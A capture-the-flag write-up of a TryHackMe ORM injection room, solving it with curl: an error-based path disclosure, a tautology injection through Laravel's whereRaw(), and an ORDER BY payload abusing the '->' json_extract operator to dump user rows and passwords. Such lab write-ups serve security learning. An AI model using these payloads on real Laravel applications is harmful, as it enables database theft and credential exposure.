# ORM Injection (TryHackMe)

Room: ORM Injection — Web Application Pentesting / Injection Attacks. SQL injection *through* a
**Laravel / Eloquent** app: a `whereRaw()` weak implementation and a Spatie/Laravel query-builder
`ORDER BY` injection via the MySQL `->` (json_extract) operator. Completed: 2026-11-09 | Target:
<ip> (`orminjection1.44--badr`). Solved **fully headless from `C:\CTF`** with `curl` — no
browser, no AttackBox.

## Answers

| Task | Question | Answer |
|---|---|---|
| 2 | Default ORM for Ruby on Rails | *(find it yourself)* |
| 2 | NOT a feature of ORM | *(find it yourself)* |
| 3 | Method defining the `users` table structure | *(find it yourself)* |
| 3 | File storing DB credentials in Laravel | *(find it yourself)* |
| 4 | Path in `DOCUMENT_ROOT` | *(find it yourself)* |
| 4 | ORM library for Spring | *(find it yourself)* |
| 4 | Session cookie name | *(find it yourself)* |
| 5 | Email associated with Jane Doe | *(find it yourself)* |
| 5 | Vulnerable Eloquent method | *(find it yourself)* |
| 5 | Flag from the **secure** input field | `THM{…}` |
| 6 | Total rows in `users` table | *(find it yourself)* |
| 6 | Password for `john@thm.com` | `THM{…}` |

## Access note (lab architecture)

The room only advertises a `https://LAB_WEB_URL.p.thmlabs.com` proxy URL, but the Laravel app is
reachable **directly on the VPN IP, port 80** — `http://<ip>/` (the app took ~1 extra minute
to bind after boot; initially only the XAMPP default vhost on 443/8080 answered). The form `action`s
are hard-coded to `https://IP/...` because `APP_URL` points at the TLS-terminating proxy; directly,
use `http://IP/...`. Both search routes are **GET**:
`/search-blind-vulnerable?email=`, `/search-blind-secure?email=`, and `/query_users?sort=`.

## Task 4 — fingerprint + path disclosure

`laravel_session` + `XSRF-TOKEN` cookies and a `Larvel Framework v.5.x` HTML comment confirm Laravel.
Submitting `email=1'` to the vulnerable field throws an unhandled `SQLSTATE[42000]` with a full Windows
stack trace, disclosing the app root:

```bash
curl -s -G "http://IP/search-blind-vulnerable" --data-urlencode "email=1'"
# *(find it yourself)*  (the unhandled SQLSTATE stack trace discloses the full Windows app root / DocumentRoot)
```

## Task 5 — weak implementation: `whereRaw()`

`Admins::whereRaw("email = '$email'")` concatenates input into raw SQL. Classic tautology:

```bash
curl -s -G "http://IP/search-blind-vulnerable" --data-urlencode "email=1' OR '1'='1"
# -> Name: John Doe, Email: john@thm.com
#    Name: Jane Doe, Email: jane@thm.com   (+ all others)
```

The **secure** field uses parameterised `User::where('email', $email)` — the payload is treated as a
literal string (no injection), and the app returns a reward flag for probing it correctly:

```bash
curl -s -G "http://IP/search-blind-secure" --data-urlencode "email=1' OR '1'='1"
# -> THM{…}
```

## Task 6 — vulnerable implementation: `ORDER BY` injection via `->`

`/query_users?sort=name` → `SELECT * FROM users ORDER BY name ASC LIMIT 2` (only 2 rows). The sort
column can't be broken with a plain quote (it's inside an identifier), but Laravel rewrites the `->`
operator into MySQL `json_extract`, so `name->"'))` terminates the generated JSON path and lets us
append SQL, `#` comments the trailing clause:

```
sort = name->"')) LIMIT 100#
```

```bash
curl -s "http://IP/query_users?sort=name-%3E%22%27))%20LIMIT%20100%23"
# [{"id":6,"name":"Alice Smith","email":"alice@thm.com","password":"<redacted-pw>"},
#  {"id":7,"name":"Bob Johnson",...,"password":"<redacted-pw>"},
#  {"id":8,"name":"Charlie Brown","email":"admin@thm.com","password":"<redacted-pw>"},
#  {"id":5,"name":"Jane Doe",...,"password":"<redacted-pw>"},
#  {"id":4,"name":"John Doe","email":"john@thm.com","password":"THM{…}"}]
```

→ ***(find it yourself)*** rows total; `john@thm.com` password = **`THM{…}`** (dumped in cleartext, no hashing).

## Lessons

- **ORM ≠ safe by default.** The abstraction only protects you when you use the parameterised path.
  `whereRaw()` / `DB::raw()` (Laravel), `.extra()`/`.raw()` (Django), `where("...#{input}")` (Rails)
  all re-open plain SQLi. Audit for those methods first — same `' OR '1'='1` payloads apply.
- **`ORDER BY` injection needs a column-context break, not a quote.** You can't quote-escape an
  identifier, but Laravel/Spatie query-builder maps the `->` arrow to `json_extract`, and the string
  argument of that function *is* quote-breakable: `name->"'))` closes the JSON-path string and the two
  parens, freeing you to inject `LIMIT`/`UNION`/subqueries, terminated with `#`. This is the
  CVE-class bug in `spatie/laravel-query-builder` + `laravel/framework` sort handling.
- **A "secure" control can still be a flag oracle.** The parameterised `where()` field didn't leak
  data, but the room rewards confirming it's non-injectable — read the response, don't assume a secure
  endpoint is a dead end.
- **Error pages are recon.** One `'` produced a stack trace giving the exact Windows app root
  (the Task 4 `DOCUMENT_ROOT` answer, *(find it yourself)*) — plus the controller file/line of
  the vulnerable method. Laravel's debug mode (`APP_DEBUG=true`) leaking in prod is itself a finding.
- **Reach past the proxy.** A `*.p.thmlabs.com` room is still a plain host on the VPN; the app bound to
  port 80 directly once it finished booting. Don't assume the advertised proxy URL is the only way in —
  probe the IP (and give slow containers a minute).
- **Headless pattern** (cf. [[ldap-injection]], [[advanced-sql-injection]], [[nosql-injection]]):
  `curl -G --data-urlencode` for the reflected tautology, a pre-encoded query string for the
  `ORDER BY` break, JSON straight out of `/query_users` — all from `C:\CTF`.
